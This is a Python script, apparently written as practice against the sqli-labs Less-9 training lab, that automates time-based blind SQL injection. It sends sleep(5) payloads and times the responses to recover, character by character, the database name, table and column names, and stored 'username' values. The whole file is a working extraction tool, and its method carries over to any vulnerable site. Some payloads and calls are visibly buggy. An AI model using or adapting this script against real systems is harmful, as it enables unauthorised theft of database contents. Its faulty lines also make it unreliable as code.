import requests
import time
 
url="http://sqli-labs/Less-9/?id=1"
headers={
"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
}
response=requests.session()
#..........................................................猜解数据库名...............................................
print("............开始猜解当前数据库库名............")
database_length=1
for i in range(1,40):
    payload_length="'and if(length(database())={},sleep(5),1)--+".format(i)
    start_time=time.time()
    response=requests.get(url+payload_length,headers=headers)
    if time.time()-start_time>=3:
        database_length=i
        print("数据库名长度:{}".format(i))
        break
    else:
        print("数据库名长度:{} 错误".format(i))
        pass
database_name=""
for i in range(1,database_length+1):
    for j in range(1,128):
        payload="' and if(ascii(substr(database(),{},1))={},sleep(5),1)--+".format(i,j)
        start_time=time.time()
        response=requests.get(url+payload,headers=headers)
        if time.time()-start_time>=3:
            print("数据库名:{}".format(database_name))
            database_name=database_name+chr(j)
            break
print("数据库名:{}".format(database_name))
#............................................................猜解表的数量.........................................................
print("............开始猜解表的数量............")
for i in  range(1,40):
    payload="' and if((select count(table_name) from information_schema.tables where table_schema=database())={},sleep(5),1)--+".format(i)
    start_time=time.time()
    response=requests.get(url=url+payload,headers=headers)
    if time.time()-start_time>=3:
        print("表的数量:{}".format(i))
        table_number=i
        break
    else:
        print("表的数量:{} 错误".format(i))
#...........................................................猜解表名.......................................................
print("............开始猜解表名............")
for i in range(0,table_number):
    table_name=""
    tablelen=1
    for j in range(1,40):
        payloadlen="?' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit {},1),1))={},sleep(5),1)--+".format(i,j)
        start_time=time.time()
        response=requests.get(url+payloadlen,headers=headers)
        if time.time()-start_time>=3:
            tablelen=j
            print("第{}个表名的长度为:{}".format(i+1,tablelen))
            break
    for m in range(0,tablelen+1):
        for n in range(1,128):
            payload="?' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {},1),{},1))={},sleep(5),1)--+".format(i,m,n)
            start_time=time.time()
            response=requests.get(url+payload,headers=headers)
            if time.time()-start_time>=3:
                table_name=table_name+chr(n)
                print("表名:{}".format(table_name))
                break
    print("表名:{}".format(table_name))
#........................................................猜解列数.................................................
this_table_name=input("请输入要猜解的表名:")
print("............开始猜解列数............")
for i in range(1,40):
    payload="' and if( (select count(column_name) from information_schema.columns where table_name='{}'and table_schema=database())={},sleep(5),1)--+".format(this_table_name,i)
    start_time=time.time()
    response=requests.get(url+payload,headers=headers)
    if time.time()-start_time>=3:
        print("列数:{}".format(i))
        column_number=i
        break
    else:
        print("列数:{} 错误".format(i))
#........................................................猜解列名..................................................
print("............开始猜解列名............")
for i in range(0,column_number):
    column_name=""
    for j in range(1,40):
        payload_length="' and if( length(substr((select column_name from information_schema.columns where table_name='{}' and table_schema=database() limit {},1),1))={},sleep(5),1)--+".format(this_table_name,i,j)
        start_time=time.time()
        response=requests.get(url+payload_length,headers=headers)
        if time.time()-start_time>=3:
            columnn_len=j
            print("第{}个列名的长度:{}".format(i,columnn_len))
            break
    for m in range(1,columnn_len+1):
        for n in range(1,128):
            payload="' and if(ascii(substr((select column_name from information_schema.columns where table_name='{}' and table_schema=database() limit {},1),{},1))={},sleep(5),1)--+".format(this_table_name,i,m,n)
            start_time=time.time()
            response=requests.get(url+payload,headers=headers)
            if time.time()-start_time>=3:
                column_name+=chr(n)
                print("列名:{}".format(column_name))
                break
    print(column_name)
#.......................................................猜解指定表中的数据条数....................................
this_column_name=input("请输入要猜解的列名:")
print("............开始猜解数据条数............")
for i in range(1,499):
    payload_number="?id=1' and if((select count(username) from {})={},sleep(5),1)--+".format(this_column_name,i)
    start_time=time.time()
    response=requests.get(url+payload_number,headers=headers)
    if time.time()-start_time>=3:
        print("{}列中的数据条数:{}".format(this_column_name,i))
        Number=i
        break
    else:
        print("{}列中的数据条数:{} 错误".format(this_column_name,i))
#............................................................猜解数据..............................................
print("............开始猜解数据............")
for i in range(0,Number):
    name=""
    for j in range(1,90):
        payload_len="' and if(length(substr((select username from {} limit {},1),1))={},sleep(5),1)--+".format(this_column_name,i,j)
        start_time=time.time()
        response=requests.get(url+payload_len,headers=headers)
        if time.time()-start_time>=3:
            length=j
            print("第{}条数据的长度:{}".format(i+1,length))
            break
        else:
            print("第{}条数据的长度:{} 错误".format(i+1,length))
    for m in range(1,length+1):
        for n in range(1,128):
            payload="' and if(ascii(substr((select username from {} limit {},1),{},1))={},sleep(5),1)--+".format(this_column_name,i,m,n)
            start_time=time.time()
            response=requests.get(url+payload,headers==headers)
            if time.time()-start_time>=3:
                name+=chr(n)
                print("第{}条数据:{}".format(i+1,name))
                break
    print("第{}条数据:{}".format(i+1,name))